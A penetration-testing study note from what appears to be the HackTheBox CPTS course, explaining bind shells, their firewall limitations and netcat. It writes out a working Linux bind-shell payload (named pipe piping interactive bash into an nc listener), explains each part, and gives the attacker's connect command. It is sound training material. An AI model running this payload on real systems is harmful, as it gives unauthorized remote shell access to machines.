---
title: "Bind Shells"
kind: topic
tags:
  - cpts-hackthebox
area: "CPTS HackTheBox"
up: "[[Shells and Payloads]]"
notion-id: 385759b9275180a78b0cebc258f14b88
---

# Bind Shells

In: [[Career]] / [[CPTS HackTheBox]] / [[Shells and Payloads]]

## Key Concept

**Bind shell** = target opens a listener, attacker connects **TO the target**.

```
Attacker (client) ──connects to──> Target (server, listening)
```

---

## Challenges with Bind Shells

| Challenge | Why it's a problem |
| --- | --- |
| Listener must already be running | No listener = no connection possible |
| Need a way to start the listener | Requires existing access or exploit |
| Edge firewalls/NAT | Usually need to already be on the internal network |
| OS firewalls (Windows/Linux) | Block unsolicited incoming connections by default |

> [!note]
> **Bind shells are easier to detect/block** because firewalls inspect and often deny unsolicited inbound traffic — even on common ports.
>

---

## Tool: Netcat (nc)

"Swiss-army knife" — works over TCP, UDP, Unix sockets, IPv4/IPv6, can proxy, handles text I/O.

```
Attacker = client
Target   = server (listener)
```

---

## Methodology

```
Start listener on target → Connect from attacker → Verify raw TCP session → Upgrade to interactive shell
```

---

## Step 1: Basic Netcat TCP Session (not yet a shell)

```bash
# Target (server) — start listener
nc -lvnp 7777
```

```bash
# Attacker (client) — connect
nc -nv 10.129.41.200 7777
```

> [!note]
> At this point you can only pass **plain text** — no OS interaction. This is just a raw TCP pipe.
>

---

## Step 2: Establish a REAL Bind Shell

```bash
# Target (server) — bind a Bash shell to the listener
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

**Breaking down the payload:**

| Part | Purpose |
| --- | --- |
| `rm -f /tmp/f` | Delete any old named pipe |
| `mkfifo /tmp/f` | Create a named pipe (FIFO) |
| `cat /tmp/f` | Read from the pipe |
| `/bin/bash -i 2>&1` | Run interactive Bash, redirect stderr to stdout |
| `nc -l ... 7777` | Netcat listens on port 7777 |
| `> /tmp/f` | Output is fed back into the pipe (creates the loop) |

```bash
# Attacker (client) — connect to get the shell
nc -nv 10.129.41.200 7777
# → Now you have an interactive bash session on the target
```

---

## Architecture Summary

| Role | Machine | Action |
| --- | --- | --- |
| Server | Target | Listens, serves the shell |
| Client | Attacker | Initiates connection, receives shell |

---

## Key Takeaways

- Bind shell = **target listens, attacker connects in**
- Requires the listener to be **manually or programmatically started** on target first (via exploit/payload)
- **Significant weakness:** inbound connections are heavily firewalled in real environments → bind shells often fail
- The named pipe (`mkfifo`) + `cat` + `bash -i` + `nc` combo is the **classic Linux bind shell payload**
- Next logical step (per module) = **Reverse shells** — flips the direction to bypass inbound firewall restrictions
